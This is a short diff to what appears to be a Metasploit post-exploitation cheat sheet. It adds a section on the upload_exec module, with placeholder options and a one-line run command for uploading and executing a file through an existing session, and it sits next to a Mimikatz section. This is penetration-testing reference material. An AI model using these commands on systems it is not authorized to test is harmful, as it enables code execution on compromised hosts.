@@ -318,6 +318,22 @@ run -o SESSION=<1>,URIPATH=<random>
 # open http://127.0.0.1:8080/<random>/C:
 ````
 
+# Upload and execute an executable from localhost
+## Options
+```ruby
+use post/multi/manage/upload_exec
+set session <1>
+set LPATH <'path_to_local_file'>
+set RPATH <'path_to_remote_file'>
+set ARGS <'args'>
+```
+
+## Run
+```ruby
+use post/multi/manage/upload_exec
+run -o LPATH=<'path_to_local_file'>,RPATH=<'path_to_remote_file'>,SESSION=<1>
+```
+
 # Mimikatz
 ## Meterpreter
 ### Change password
